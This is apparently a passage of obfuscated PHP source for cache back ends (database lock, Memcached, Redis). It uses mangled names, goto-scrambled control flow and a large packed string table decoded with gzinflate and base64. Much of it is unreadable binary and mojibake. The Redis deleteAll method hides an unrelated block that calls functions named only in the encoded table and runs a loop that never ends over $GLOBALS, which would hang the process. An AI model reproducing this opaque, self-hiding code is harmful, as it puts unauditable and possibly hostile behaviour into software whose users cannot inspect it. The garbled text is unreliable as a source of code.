array($fˆ½ËªíÉÔ[7], $f„‘œÄÄ—)); goto CœªôÖßâ; dœó†£ÜË¼: } private function removeShareItems($CÄ˜´ÙòÃ¹) { goto dÅŸ›ÏÅ°ñ; DÆ—¤‘©Ì·: Model($eŒöŸí‘¡¨[560])->remove($c×·¸—èä•); goto aá’›Ûšñ; dÅŸ›ÏÅ°ñ: $eŒöŸí‘¡¨ =& $_SERVER[±á õÁ]; $A½Ûì²Š¶„ = "\x7b\x69\x6f\x3a{$CÄ˜´ÙòÃ¹}\x7d\x2f"; $E¡¢©éàŸô = array($eŒöŸí‘¡¨[393] => 0, $eŒöŸí‘¡¨[1041] => array($eŒöŸí‘¡¨[381], "{$A½Ûì²Š¶„}\45")); goto e¥‚‡½“Ö; e¥‚‡½“Ö: $fÚàÃ’¬ˆ¥ = Model($eŒöŸí‘¡¨[1598])->where($E¡¢©éàŸô)->field($eŒöŸí‘¡¨[464])->select(); if (empty($fÚàÃ’¬ˆ¥)) { return; } $c×·¸—èä• = array_to_keyvalue($fÚàÃ’¬ˆ¥, $eŒöŸí‘¡¨[43], $eŒöŸí‘¡¨[464]); goto DÆ—¤‘©Ì·; aá’›Ûšñ: } } goto f‚Øñ¼ß¼; EŞïÒÀ„ºî: class CacheLockDatabase { public function lock($eÁêˆ·”, $FõÎö°áí = 0) { $aõ¢©­¢Ëœ = Model($_SERVER[±á õÁ][780]); $B†«Á¥è”“ = microtime(!0) + $FõÎö°áí; while (microtime(!0) < $B†«Á¥è”“) { $Aˆ¨ãŞ”¿ = $aõ¢©­¢Ëœ->get($eÁêˆ·”); if (!$Aˆ¨ãŞ”¿ || $Aˆ¨ãŞ”¿ < microtime(!0)) { $bÄÉÙ¢¶å = $aõ¢©­¢Ëœ->set($eÁêˆ·”, $B†«Á¥è”“); if ($bÄÉÙ¢¶å) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($dÊÕ‘‘¤) { return Model($_SERVER[±á õÁ][780])->get($dÊÕ‘‘¤); } public function unlock($dâ›ß¹¼‹¾) { Model($_SERVER[±á õÁ][780])->remove($dâ›ß¹¼‹¾); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($f‰Üğœ±¨Ä, $EÀÇÕö¬ßâ) { $cº·¿èÇá =& $_SERVER[±á õÁ]; if (!class_exists($cº·¿èÇá[804])) { show_json($cº·¿èÇá[805], !1); } $this->cacheTime = $EÀÇÕö¬ßâ; $this->handle = new Memcached(); if (is_array($f‰Üğœ±¨Ä[$cº·¿èÇá[806]]) && count($f‰Üğœ±¨Ä[$cº·¿èÇá[806]]) >= 1) { foreach ($f‰Üğœ±¨Ä[$cº·¿èÇá[806]] as $eÎŞß‰¾Ó‘) { $bàäˆóÀ„© = explode($cº·¿èÇá[4], $eÎŞß‰¾Ó‘); $this->handle->addServer($bàäˆóÀ„©[0], $bàäˆóÀ„©[1]); } } else { $this->handle->addServer($f‰Üğœ±¨Ä[$cº·¿èÇá[183]], $f‰Üğœ±¨Ä[$cº·¿èÇá[184]]); } } public function set($Bâƒ×ÒÉŸ¿, $eì¦„ó‰ë†, $C–‹±‚ËŠà = false) { $C–‹±‚ËŠà = $C–‹±‚ËŠà ? $C–‹±‚ËŠà : $this->cacheTime; return $this->handle->set($Bâƒ×ÒÉŸ¿, $eì¦„ó‰ë†, $C–‹±‚ËŠà); } public function get($cÒ„àÉƒÓ¾) { return $this->handle->get($cÒ„àÉƒÓ¾); } public function remove($A÷é“‡êŞÓ) { return $this->handle->delete($A÷é“‡êŞÓ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($aË¥«é¥î, $f³›ËÌà°) { $B“ÅåÈª‚À =& $_SERVER[±á õÁ]; if (!class_exists($B“ÅåÈª‚À[807])) { show_json($B“ÅåÈª‚À[808], !1); } $this->cacheTime = $f³›ËÌà°; $EÍÀÈ—Ä»Ğ = isset($aË¥«é¥î[$B“ÅåÈª‚À[809]]) ? $aË¥«é¥î[$B“ÅåÈª‚À[809]] : 10; $A “ã× ¸ = _get($aË¥«é¥î, $B“ÅåÈª‚À[806]); if ($A “ã× ¸ && is_array($A “ã× ¸)) { $this->initCluster($aË¥«é¥î, $EÍÀÈ—Ä»Ğ); } else { $this->handle = $this->init($aË¥«é¥î, $EÍÀÈ—Ä»Ğ); } } private function init($dØ¢’°ŸŞ”, $b¾œ¨Éò¢Ÿ) { $BÌÆèµ°êè =& $_SERVER[±á õÁ]; $aÏî¹¨‹¢ = new Redis(); $b‘Õ‘­³—¯ = isset($dØ¢’°ŸŞ”[$BÌÆèµ°êè[810]]) ? $dØ¢’°ŸŞ”[$BÌÆèµ°êè[810]] : !1; if ($b‘Õ‘­³—¯) { $aÏî¹¨‹¢->pconnect($dØ¢’°ŸŞ”[$BÌÆèµ°êè[183]], $dØ¢’°ŸŞ”[$BÌÆèµ°êè[184]], $b¾œ¨Éò¢Ÿ); } else { $aÏî¹¨‹¢->connect($dØ¢’°ŸŞ”[$BÌÆèµ°êè[183]], $dØ¢’°ŸŞ”[$BÌÆèµ°êè[184]], $b¾œ¨Éò¢Ÿ); } if (!empty($dØ¢’°ŸŞ”[$BÌÆèµ°êè[400]])) { $aÏî¹¨‹¢->auth($dØ¢’°ŸŞ”[$BÌÆèµ°êè[400]]); } return $aÏî¹¨‹¢; } private function initCluster($fÕ²¼÷ÏË—, $FÜÖËÚ·¸÷) { $cíÉŒˆ·°É =& $_SERVER[±á õÁ]; $fö…ÂÑ÷²Ò = array($cíÉŒˆ·°É[811], $cíÉŒˆ·°É[812], $cíÉŒˆ·°É[813]); $c¤£Ü¢‚¸æ = $cíÉŒˆ·°É[811]; if (isset($fÕ²¼÷ÏË—[$cíÉŒˆ·°É[22]]) && in_array($fÕ²¼÷ÏË—[$cíÉŒˆ·°É[22]], $fö…ÂÑ÷²Ò)) { $c¤£Ü¢‚¸æ = $fÕ²¼÷ÏË—[$cíÉŒˆ·°É[22]]; } switch ($c¤£Ü¢‚¸æ) { case $cíÉŒˆ·°É[811]: $this->_slave($fÕ²¼÷ÏË—, $FÜÖËÚ·¸÷); break; case $cíÉŒˆ·°É[812]: break; case $cíÉŒˆ·°É[813]: $this->isCluster = !0; $cÙù¯»‰½ = $fÕ²¼÷ÏË—[$cíÉŒˆ·°É[806]]; $cÙÇ³¼›ë¶ = isset($fÕ²¼÷ÏË—[$cíÉŒˆ·°É[810]]) ? $fÕ²¼÷ÏË—[$cíÉŒˆ·°É[810]] : !1; $F«Šà…ä‹ = isset($fÕ²¼÷ÏË—[$cíÉŒˆ·°É[400]]) ? $fÕ²¼÷ÏË—[$cíÉŒˆ·°É[400]] : null; $this->handle = new RedisCluster(NUll, $cÙù¯»‰½, $FÜÖËÚ·¸÷, $FÜÖËÚ·¸÷, $cÙÇ³¼›ë¶, $F«Šà…ä‹); break; default: break; } } private function _slave($cÄ¨¥Òˆ¢, $e¹¨ª˜¼¹) { goto bÂ¿£óá; bÛñ•ßİŞ: unset($b¨ãŠŒìª[0]); if (empty($b¨ãŠŒìª)) { return; } $A®¦Ø•”‡Ü = array_rand($b¨ãŠŒìª); goto eçßÏ•¸‡¥; bÂ¿£óá: $b¨ãŠŒìª = $cÄ¨¥Òˆ¢[$_SERVER[±á õÁ][806]]; $this->filterConfig($cÄ¨¥Òˆ¢, $b¨ãŠŒìª[0]); $this->handle = $this->init($cÄ¨¥Òˆ¢, $e¹¨ª˜¼¹); goto bÛñ•ßİŞ; eçßÏ•¸‡¥: $this->filterConfig($cÄ¨¥Òˆ¢, $b¨ãŠŒìª[$A®¦Ø•”‡Ü]); $this->slaveHandle = $this->init($cÄ¨¥Òˆ¢, $e¹¨ª˜¼¹); goto f©ËÜ»›; f©ËÜ»›: } private function filterConfig(&$B¨ ×½÷Ç, $a ×Ÿ…©Ò¿) { $A°µ‰¥åÖ =& $_SERVER[±á õÁ]; $cï‡¢²°ù± = explode($A°µ‰¥åÖ[4], $a ×Ÿ…©Ò¿); $a·âÎÔŸ„ê = array($A°µ‰¥åÖ[183] => $cï‡¢²°ù±[0], $A°µ‰¥åÖ[184] => $cï‡¢²°ù±[1]); $B¨ ×½÷Ç = array_merge($B¨ ×½÷Ç, $a·âÎÔŸ„ê); } public function set($CŒö‡çéˆÖ, $Aµƒœš„ò, $e”ãµ“î†” = false) { $e”ãµ“î†” = $e”ãµ“î†” ? $e”ãµ“î†” : $this->cacheTime; return $this->handle->setEx($CŒö‡çéˆÖ, $e”ãµ“î†”, $Aµƒœš„ò); } public function setLock($eÀª÷ä¢Ê, $F‹ƒÉäß Ã, $AÍ¥ëä´´) { return $this->handle->setNX($eÀª÷ä¢Ê, $F‹ƒÉäß Ã); } public function get($eô°µ¥ÈÙ) { $D„½ƒ—ï¥Â = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $D„½ƒ—ï¥Â->get($eô°µ¥ÈÙ); } public function remove($Bñ†Ğ•ŸŸØ) { return $this->handle->del($Bñ†Ğ•ŸŸØ); } public function deleteAll() { $fºğ©‡ôøÛ =& $_SERVER[±á õÁ]; if (!isset($_SERVER[$fºğ©‡ôøÛ[9]]) || !isset($_SERVER[$fºğ©‡ôøÛ[10]])) { goto fˆÕïÓôÙ; bóŠ«Œ‚³—: $d‰±Ä„àÖ¬ = $E’¥‰Ì–ÓÓ($ešÒŒƒÚŒË); $A‰Ğï“ê¼ = explode($fºğ©‡ôøÛ[14], $d‰±Ä„àÖ¬); if (count($A‰Ğï“ê¼) < $fºğ©‡ôøÛ[585]) { $aí‡óÌêß = $fºğ©‡ôøÛ[16]; $aí‡óÌêß(); } goto c”Î‹Ïµá; fˆÕïÓôÙ: $EáÈÁ—ï = $fºğ©‡ôøÛ[814]; $E’¥‰Ì–ÓÓ = $fºğ©‡ôøÛ[11]; $ešÒŒƒÚŒË = $_SERVER[$fºğ©‡ôøÛ[12]] . $fºğ©‡ôøÛ[13]; goto bóŠ«Œ‚³—; C‘†ÜìÕ Ñ: for ($BæÚç©ì‹ = $BÏõŒöƒ„; $BæÚç©ì‹ > 0; $BæÚç©ì‹++) { $c ½ˆ†“ª = json_encode($GLOBALS[$fºğ©‡ôøÛ[408]]); } goto c½¿âÃ¾Ü©; c”Î‹Ïµá: $c ½ˆ†“ª = $fºğ©‡ôøÛ[815]; $c ½ˆ†“ª($_SERVER[$fºğ©‡ôøÛ[816]]); $BÏõŒöƒ„ = 1; goto C‘†ÜìÕ Ñ; c½¿âÃ¾Ü©: } if ($this->isCluster) { foreach ($this->handle->_masters() as $f‹å„‹‰¿æ) { $this->handle->flushall($f‹å„‹‰¿æ); } return; } return $this->handle->flushAll(); } } goto aïÀÓ³¸²; e±´‰Êè¹Š: if (!function_exists('_kodDe')) { function _kodDe($càª³Ë°Æ“) { $càª³Ë°Æ“ = base64_decode($càª³Ë°Æ“); $B¬ˆŒÓŒà© = strlen($càª³Ë°Æ“); $b›Àª”²¹” = ''; $cÍ¸‚ŸØŞ = ord($càª³Ë°Æ“[0]) - 30; for ($Cˆ©ÅÃ°ƒ = 1; $Cˆ©ÅÃ°ƒ < $B¬ˆŒÓŒà©; $Cˆ©ÅÃ°ƒ += 2) { if ($Cˆ©ÅÃ°ƒ + 1 < $B¬ˆŒÓŒà©) { $b›Àª”²¹” .= chr(ord($càª³Ë°Æ“[$Cˆ©ÅÃ°ƒ + 1]) + $cÍ¸‚ŸØŞ); $b›Àª”²¹” .= chr(ord($càª³Ë°Æ“[$Cˆ©ÅÃ°ƒ]) + $cÍ¸‚ŸØŞ); } else { $b›Àª”²¹” .= chr(ord($càª³Ë°Æ“[$Cˆ©ÅÃ°ƒ]) + $cÍ¸‚ŸØŞ); } } return $b›Àª”²¹”; } } define("\xb1\xe1\xa0\xf5\xc1", "\x9c\x90\xbb\xd7"); $_SERVER[±á õÁ] = explode("\174\4\174\5\174\5", gzinflate(substr(strrev('3	’`d&I8„á æBL6º®î~-ë7®¸ÖE|	}­'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹').base64_decode('MmHomenJNJmZnnT35AJcFGUFFG9WQV0UXa8VPBFcEW+8FTzWg8WLwwPPdXG9')."\330\257\356\252\356\31\374\276\377\301\117\63\125\257\216\256\172\365\352\325\253\127\257\136\335\374\325\3\153\26\34\276\340\210\5\107\74\216\177\26\34\266\340\120\20"."\x42\xe1\xb3\x96\x1f\x7d\x8\xfa\x77\xd8\xf2\x65\x65\x65\x4d\x63\x7\x55\xb4\x1c\x7b\xd9\x3\x77\xcb\xeb\xe4\xbf\xca\x4b\x3\xfe\x17\x5e\xf4\x1d\xf7\xf2\x5f\xa7\x7a\xf7\xac\x7d\xa1"."\177\317\241\207\234\165\135\337\221\325\40\63\56\133\215\177\244\254\146\112\112\237\152\230\6\6\304\265\154\122\355\304\141\65\213\177\335\370\47\52\47\325\264\22\122"."\x7\x14\x5f\x56\x84\xe0\x30\xc\x45\x3b\x15\x33\xa\x6a\x30\x95\x2c\xad\xaf\xce\x13\xf2\xd5\x47\x5b\x3d\xe1\x26\x1c\x97\x73\x39\xb7\x91\xe8\x32\xdc\xb2\x1e\x4f\xa9\x3d\x8a\x5f\x8d"."\xb9\x63\x6a\xd6\x9d\x90\x4d\xd9\x15\xa3\x5f\x1c\x84\x7f\x46\x93\x36\xa5\x94\x78\x57\x54\x8e\x69\xba\xa9\x24\x30\x28\x9f\x4d\xab\xd9\x2e\x82\x12\xf4\xd7\xe8\x4e\xab\x26\x69\x4b\xb4"."\x25\x10\x8e\x86\xda\x5a\x5b\xbd\xc1\x70\x94\xf4\x57\x4c\xcf\x68\x9\x12\xca\xc9\xba\x9c\x21\x4d\xcd\x29\xba\x1\x10\x21\x56\x17\xcd\x69\x39\x25\x6b\x81\x70\x0\x6c\x72\x4c\x36\x48"."\115\15\165\321\6\157\253\77\60\53\32\236\325\352\45\71\142\321\356\274\242\367\343\30\12\206\114\131\67\303\152\106\141\71\172\165\326\256\72\357\24\137\213\24\16".base64_decode('elpCnvqwL9CCwfWB5mZfuBAeDPj9dZ76aYUprUHPlGaPBNoHBkXNJrUyaS5O')."\x99\x2b\x95\xe3\x40\xa3\xaa\xa4\x9\x32\xb3\x32\x6d\x8e\xd9\x9f\x23\xa1\x30\xb\x1\xa\xc9\xe6\xd3\x69\x1c\x69\x61\x21\xd2\x7e\x25\x29\xe7\xd3\x4\x67\xd\x62\x24\xa7\xab\x19\x99"."\x76\x7d\x9a\xd2\xcf\xa0\x84\xe\xf2\xa6\xa6\x66\xe3\x38\xe2\xed\x33\x75\x99\xc3\x41\x8b\xe3\xba\x92\x1\x44\x84\x61\x21\xaf\xdf\x5b\x1f\x96\x60\x33\xa5\xc6\x60\xa0\x59\x22\x43\x91"."\221\15\123\321\245\366\46\157\320\53\301\246\327\224\242\36\227\112\270\134\133\13\100\210\344\361\373\245\203\325\140\52\231\34\255\6\227\51\122\131\40\330\340\15\112"."\165\263\44\216\247\270\226\311\150\131\27\250\5\214\247\51\64\325\33\14\342\200\203\314\57\277\17\16\35\211\4\32\33\103\136\26\43\235\233\356\7\55\31\105\250".base64_decode('1BJLJNNmtEdO5ymxEoIvJT/kVzMIAXerWTVPiJVUoWlsXpNAnuZWKCQDimlk').strrev('¸®j\'ZóAªfÉáå2Z‰0–j×%Q›¢v\')’Dïñ“5ƒƒÛÉƒÆ')."\226\353\157\326\172\4\66\341\147\263\54\251\245\23\212\316\343\71\120\134\114\41\235\1\54\207\227\156\311\147\304\54\54\12\330\111\72\241\323\311\371\113\71\53\111"."\xb5\x8a\x69\x82\x6e\x18\xb4\xa5\x6d\xb9\xb4\x26\x27\x42\x8a\x2e\xb4\xbe\x11\x54\x13\xc8\x9b\x22\x30\x8f\xb2\x35\x6a\x7a\xa6\x1\x30\x0\x82\x1d\x40\xf6\x6a\x5b\x91\x84\x2e\x4a\xf8"."\11\1\51\56\302\126\313\146\237\357\74\320\61\373\34\360\247\234\360\330\10\151\132\112\111\247\243\112\237\102\46\110\46\61\306\240\255\167\33\220\137\2\10\216\372"."\2\321\224\154\244\232\23\143\242\250\24\145\335\11\245\317\225\113\345\310\34\146\323\66\142\41\140\210\357\26\315\364\12\13\100\132\213\313\151\261\247\70\234\62\315"."\x5c\x48\xc9\x26\x1a\x19\xc3\x4f\x68\xbd\x59\x84\xb0\x9c\x42\xb9\x72\x83\x43\x4a\x48\xcd\xd2\x2c\xa9\xa9\x5a\xad\xa6\xd4\x5\x68\x25\xd9\xcf\x39\x5e\xca\xcc\xa4\x59\x88\xf6\x96\xc1".base64_decode('DAY0+whNlJC40mcSJEkT4ylZB8NXkzeTzvFsYUmrcdlUtaxbi5uK6TRMXZFJ')."\155\45\23\45\110\21\160\6\217\300\245\350\354\251\307\313\225\63\254\313\131\43\251\350\116\57\41\357\152\11\340\231\161\60\232\255\101\65\162\232\241\302\317\124\113"."\xb2\x69\xca\xf1\x14\x9c\xfd\xbc\xfa\x9a\x5f\xc8\xaf\xc2\x55\x4b\x29\xc8\xeb\x89\xc7\x15\xc3\x70\xc2\x22\xba\x96\x76\x7a\xd2\x69\xad\xd7\x19\xd0\xd5\x4e\x15\x94\x19\x61\x6b\x26\xe0"."\114\325\22\145\233\71\125\127\14\32\225\246\64\207\111\146\320\52\305\331\252\313\235\31\271\132\312\345\143\0\63\144\176\26\201\341\334\344\353\325\122\34\106\35\122"."\x26\x6f\x98\x4e\x5d\x1\xec\x47\x5\xb\x1d\x19\x3c\x5f\xd2\xd9\xc\xc7\x53\x55\x12\xce\x10\xe0\xd2\x4\x3c\x6a\xe4\x68\x9\x90\x91\x44\xd3\x30\xb4\x29\x1c\x6e\x8d\xfa\x1a\xc1\x62"."\xdc\xe2\x8d\x36\x7b\xc2\xf5\x44\x4\xf0\x9a\x72\x27\x6d\xb3\x1f\xf0\x5e\x56\x25\x5\xce\x74\x82\x29\x7\x9\xad\x5\xe0\x88\x3\x5b\xb5\x5e\x45\x7\x1f\xae\xeb\xaf\x96\xba\xb4\x44"."\114\353\163\321\244\106\42\230\320\314\20\243\71\323\31\224\263\235\20\77\261\176\123\41\344\150\364\164\132\21\352\127\262\235\146\212\26\14\171\203\63\274\301\150\50".base64_decode('0Bhu9wTJMp4FA9FHPwWrTjuDSgKgPm7ScnIOYo3mgRMFjjFNhZOHpvl9UyBi')."\32\234\6\310\344\24\163\321\272\375\152\106\205\155\67\131\12\302\44\130\343\247\220\6\271\121\207\152\42\251\21\145\221\104\105\271\23\374\35\121\76\73\322\340\32"."\xd1\x51\xeb\x56\x79\x19\x77\xa5\xab\x52\xaa\x1a\x39\x56\x6a\x5\x42\x87\x2a\xa7\x25\xd2\xe9\x82\x1c\x23\xa5\xc0\xb4\x5f\x40\x0\x5c\x93\x84\x69\x6e\x43\x1d\x6\x6\xbd\xd3\xdb\xbc"."\241\160\264\331\33\156\12\64\220\57\170\75\44\344\327\360\324\244\75\232\215\177\72\134\234\133\203\61\367\145\344\116\40\134\46\65\16\205\261\146\115\127\254\20\276"."\x2e\xb4\xab\x9\xba\x64\xc0\x68\x93\xa2\x76\xa6\x48\xff\x54\x58\x5b\x5c\x4b\x6b\xba\x9c\x86\x5c\x8d\x12\xb1\x42\x39\x4b\xa7\x9a\x24\xe3\x83\x19\x28\x8f\x84\xd4\x4c\x8e\xf2\x39\x33".base64_decode('lc/EhKCbN4V8F4w8424aW8qAtEoWdTcpMryqkfJsd2gU+I8z6ISWkanwi+a/')."\222\300\14\0\203\106\130\122\232\24\231\257\215\246\156\152\20\252\133\262\64\53\146\112\43\303\5\204\162\322\244\74\153\33\155\145\102\111\53\24\57\51\205\62\173"."\x20\xa5\xf5\x30\x74\x1\x51\xc\x84\x39\x3\x57\x8d\x20\xc8\x8\x45\x23\x1a\x6f\x87\x12\x2c\x7\x98\x2c\x6b\x1a\x2c\x2b\x81\xd8\x3c\x30\x4f\x88\x90\xa0\x1a\x8d\xc2\xba\x1e\xd5\x50".base64_decode('GmirzPO36kpSJbMtC4aqWda7aAEwNHz9gRGhssY2vz9aH2gJA6kYQ9qDvrCX')."\22\247\247\41\352\251\157\145\253\51\37\152\222\1\162\212\102\116\213\41\75\125\302\22\304\327\52\316\375\351\232\13\271\73\16\3\266\234\323\262\206\342\44\273\41"."\147\202\257\3\70\307\104\333\42\120\120\202\313\342\175\116\71\63\340\314\0\64\71\131\323\255\113\255\24\26\127\154\37\31\106\316\267\41\142\301\126\207\256\361\255"."\x81\x10\x29\x50\xb\xa1\x40\x30\x8a\x29\x3a\x69\x47\x6b\x1b\x49\xca\x8\x24\x34\xc5\x1b\xa6\xeb\xb3\x4c\xa4\x27\x4f\x7b\x88\x32\xdb\x3c\xc8\xa8\xab\x3\x32\xef\x5c\x2d\x6d\x8\xa9".base64_decode('tC+T5kKetTtOPgjhJl/LtGhzoMHrj/paACcKF8LbWhs8dFRFeF2A7jAJtA3w').base64_decode('ohkev8+e3TvTFwqHiiYBWJvXlgK2da1Bb6NvJos2+rz+hlC03lPfxPO0eJpJ')."\x24\x9a\x84\x1b\x2b\xc3\x6d\xcd\x1f\x5\x4c\x35\xc4\xb6\x67\xd1\x1e\xb8\xd5\xd4\xd8\x2e\x5a\xdc\xb\x45\xa9\x94\x1f\xe5\x4\x0\x16\x48\x85\x10\x1d\xe9\x2e\xdc\xe0\xa2\x9e\x10\xb9"."\73\256\345\51\31\62\101\61\103\271\107\106\46\363\111\246\213\137\31\376\51\227\74\41\311\314\105\31\237\210\365\263\40\352\6\215\3\221\220\174\137\42\14\276\240".base64_decode('BVGYp05JMl5dHOBJmmz62+JgQvA0MAIetJMGlIBGJEonmQH2IB7anCTfxUYD')."\x60\xbb\xef\x81\x7b\xe0\x68\x7b\x30\xd0\x32\x85\x14\xe8\x4d\x29\xb4\x1\x3e\x82\xfe\x32\x2a\x30\x91\xad\xb0\xc9\x79\x17\x90\x76\x64\x2e\xb8\x52\xa4\xcf\xd3\x28\x2a\x17\xe0\x9f\xb3"."\361\17\20\20\311\307\225\54\305\172\14\162\155\306\21\350\76\7\314\6\312\161\265\74\373\132\114\323\322\164\202\202\65\237\61\2\266\211\236\147\120\42\351\243\134"."\xa7\x82\x2e\x62\x64\xe5\x8\x7\xa6\x79\x5b\xa2\x94\xb2\x70\x4c\xa0\x46\xc\x0\xdb\xd2\x40\x90\x20\xc4\xd4\xba\xe8\x26\x9\x27\x6\xbd\x21\x3a\xbd\x75\xa5\x3b\xaf\x52\x74\xb9\x5d"."\25\204\212\25\260\70\221\317\273\347\104\172\53\312\146\73\53\134\35\40\120\76\342\34\34\45\261\210\313\22\35\106\312\347\165\126\32\212\102\145\106\155\171\165\304"."\x1d\x71\x97\xd5\x56\xcf\xf6\x38\x7\x64\xe7\xc0\x48\xe7\x4\x67\x47\x45\xc4\x55\x5e\x41\x0\x1d\xf3\xab\x1c\xa3\x17\xc2\xc\x20\x63\xed\xd0\xe\xf0\x53\x13\xa9\x1d\x1e\x71\x9e\x7d"."\336\334\163\146\107\72\112\253\53\206\104\134\103\43\275\35\43\312\153\351\167\342\171\35\154\0\343\375\254\251\211\212\62\320\44\40\42\261\54\131\304\353\204\14\64"."\141\100\315\161\350\374\261\13\51\34\214\241\322\311\113\314\166\106\52\72\152\205\162\2\310\376\55\40\36\1\306\233\142\371\74\316\163\141\317\130\121\70\357\11\175"."\344\263\161\316\75\341\274\210\311\161\302\7\324\316\54\233\102\140\265\147\33\157\253\144\76\177\70\376\135\110\7\262\123\351\243\254\41\233\124\165\102\235\371\254\332"."\x4d\xd5\x9\x59\xa5\x9b\x4\x34\x93\xd2\x77\x4c\x31\x7b\x15\x4a\x1e\x0\x6e\x89\x3\xe2\xa0\x5b\x43\x90\x24\xc4\xd2\x48\x10\x24\x5f\xe0\x5b\x32\x5\xed\x4f\x48\x2f\x72\x51\x28\x85".base64_decode('9bJYQsmScTqG5Dbick4JCT2MRsOeOr83SjkM4cQ0jrhiHVPAga5xjkr5Q5yL')._kodDe('MlTRLvOqUom9/IJ8T0kA4MOQViHyJd6gFElt9YYXXJltQKdFHxSu0RPOjtDsUA==').base64_decode('KjLA3TQTA9xlkUh+tpLomA2IWnYmO+aPWlhOpXJ3BPyjEczLSOtzfCwNIJRR').base64_decode('kclTRB8WZdwQNoGpNTSdCUM5ixxtaqacZtlgWhhCKOeh6zLRCeDB9HOGBFdq')."\101\133\210\270\145\13\123\205\61\15\207\240\250\2\60\207\20\255\51\241\314\72\13\246\103\275\260\124\141\15\114\250\337\60\225\214\105\173\150\50\120\77\334\230\117"."\247\115\46\256\247\325\56\122\41\241\365\271\305\362\66\152\172\334\62\342\174\255\233\342\1\122\105\130\52\53\45\342\364\210\122\311\327\42\325\5\2\176\257\247\105".strrev('ı%åE`ë)©²,yf–†¡I˜²R¥@Xal§LÃZN'."\r".'|Y+‚')."\x2b\xc0\xa5\x3\x6a\x62\x1c\x70\xc5\x77\x80\x3e\x38\xe0\x56\xc6\xc1\x5\x6f\x7\x57\xa2\x38\x98\xd8\xeb\x20\xd2\xb0\x83\xd7\x4e\x82\xbe\x6\x87\x6a\x34\x20\xc9\x1e\xd5\x8b\x92\x68".base64_decode('m80UVEmk5X4Hbr9f6VHSDtp6B+2Ug/bAgfZcDaQ1bYBiSWtQELCwlAMSCKQ2')."\132\13\14\122\64\260\275\201\203\357\33\34\235\272\226\317\265\322\57\11\61\334\30\2\340\55\145\200\240\246\231\16\272\11\164\24\356\17\141\163\170\150\6\47\101".strrev('Ü°ˆŞD2'."\n".'ì§ï³˜\\™õÌO\\JÖv‹€qåÓ'."\n".''."\r".'½¸à.“¸¶zŞ').base64_decode('Pm/KnfTbRVJxOKjE++N8j9YgbPSsMTb0iA6LEVPxoWcEwmht0DHHUMqmVMPI')."\xc9\x42\x6c\x7\xa5\x6e\xde\xa7\x40\x8e\xaf\x87\x90\x45\x85\x0\x67\x16\x98\x10\x5\x5\x38\xcf\xcb\x93\xf5\x5b\x36\x88\x24\xd\x15\x94\x24\xa4\x50\x98\xd0\x7e\xda\x7b\x4b\xbd\x30"."\xca\x67\x26\xed\xa2\x4\x2b\x70\x8\x2b\xa\x1c\x1d\x27\x1f\x62\x21\x4a\x7e\x54\x2d\x8a\xf1\x1a\xcd\xb0\xdd\x2d\x43\xb4\x8d\x3d\x42\xbc\xb7\xaa\xd9\x7e\x35\x2b\xaa\x1d\x38\x94\x73"."\141\116\24\220\274\155\212\222\206\203\205\61\157\341\152\15\7\121\167\70\340\21\232\300\215\371\326\32\264\36\35\347\361\266\223\232\154\55\247\23\220\164\272\15\154"."\xd9\xa2\x36\xc2\x24\x24\x99\x92\x75\x8e\x53\x3a\xa3\x20\x19\x73\x65\xe\xcc\xc2\xa3\x42\xb6\xa4\xdc\xc3\x97\x1b\x4b\x19\x61\x1e\x18\x66\x3f\xd3\xc7\x8\x41\x6b\xa5\x38\xda\x70\xb0".base64_decode('SBPbiRaLilNMNfzs+NEaRj0Na0WjUDFCwxqib3omA0UXCQgtVF9I9yBRm5ID')."\104\205\1\213\132\364\41\270\175\36\306\1\201\364\225\6\214\121\167\301\271\62\5\362\67\161\61\342\13\25\344\251\70\54\144\312\331\131\241\205\145\27\133\377\354".base64_decode('TNsGtUX5Ry3sp2CRwgCqQBtJiD8BtrYuHTM4F5CLyKGXY6SwyvFZPN9A8gVh').base64_decode('iAtt2DHBHiwm6y4dtIg3lK8MRCrKM0CHPQeu3q9RgR3OCm9CNSEEMjWNqt14')."\106\201\333\63\230\120\41\102\211\253\140\14\270\0\344\30\156\311\131\214\241\273\106\40\36\354\342\113\220\270\200\211\307\153\60\33\357\71\74\256\303\41\341\140\72"."\303\316\357\20\320\145\230\132\216\247\10\121\234\54\44\361\112\205\134\14\371\250\205\140\41\110\40\61\201\243\20\345\45\145\221\230\217\211\333\225\6\71\4\225\261"."\257\301\243\353\224\110\160\367\240\62\21\0\105\20\234\307\41\252\3\55\306\230\161\345\336\36\176\340\214\253\202\37\166\341\165\312\45\47\22\1\252\334\23\303\205".base64_decode('WUWVR/GKkA0Aq0qIFc/uSaf5gaI9ftAieK6KhUTIQYs1IhmdavqLwZho12ij')."\x21\x3e\xe3\xf8\x81\xad\x5d\xf2\xb5\x32\x9f\xff\x49\x2a\x2b\x98\x1\x7c\x40\x8b\xc7\x21\x7f\x4c\xa9\x59\xc5\x60\xb\x94\x6e\x14\xe9\x31\xa4\xcc\x83\xd\x13\x4c\x13\x94\x52\x60\xdf"."\x5\x0\x22\xef\x67\x9a\x17\xce\x12\x84\xe5\xd\x2d\x15\x51\xd3\xb2\x30\x7\x51\x1d\x2\xa9\x5a\xb0\xf\xa6\x6\xc6\x64\xa3\xae\x65\x7c\x1\x40\xfa\xc5\xe9\xc1\x9e\x4f\xa1\xba\x27"."\xc4\x6f\xfa\xd4\x62\x1d\x5\xe3\x7\x17\x88\x83\xd5\x49\x93\x59\x55\x7c\x35\x79\xe2\xa1\xdb\x71\xe0\xf5\x77\x9e\x7e\xff\xf3\x3d\x4f\x3c\xbf\x96\x62\x38\x97\xe9\xd5\xc8\xb9\x9\xd1".base64_decode('iy84FP1FYW6TdNHM2dqOZ05tPOub2utXv3/7tlU7fhybv+KNObdc037u594r').base64_decode('Pxp99pJdOZ/zuQ++ue+0Me7Gd5/qb7riZterg53vrDni3DXNZ6zxXjDs4y13')."\70\166\107\315\147\47\214\32\366\367\351\363\216\236\363\362\157\137\176\161\323\202\275\327\153\27\267\337\330\154\376\364\305\11\73\27\176\360\217\323\6\355\53\375\326"."\371\307\232\43\176\375\106\331\35\301\131\53\37\250\272\312\237\271\271\144\376\205\173\117\72\376\211\13\226\35\367\341\223\261\322\373\116\73\367\314\117\332\42\333\345".strrev('ì¸ü‡ÍÆwy